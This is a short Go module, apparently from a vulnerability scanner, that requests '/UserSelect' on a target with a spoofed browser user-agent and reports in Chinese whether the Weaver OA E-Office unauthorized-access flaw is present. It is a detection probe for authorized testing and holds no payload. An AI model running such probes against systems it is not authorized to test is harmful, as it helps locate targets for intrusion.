package ecology_Userselect

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().SetTimeout(5 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0"
)

func Run(url string) {
	vulnUrl := url + "/UserSelect"
	resp, err := client.R().
		SetHeaders(map[string]string{
			"User-Agent": UA,
		}).Get(vulnUrl)

	if err != nil {
		color.Red.Println("[-18]泛微OA E-Office UserSelect 未授权访问漏洞不存在")
		return
	}

	if resp.StatusCode == 200 {
		color.Green.Println("[+18] 泛微OA E-Office UserSelect 未授权访问漏洞存在 -> ", vulnUrl)
	} else {
		color.Red.Println("[-18]泛微OA E-Office UserSelect 未授权访问漏洞不存在")
	}
}
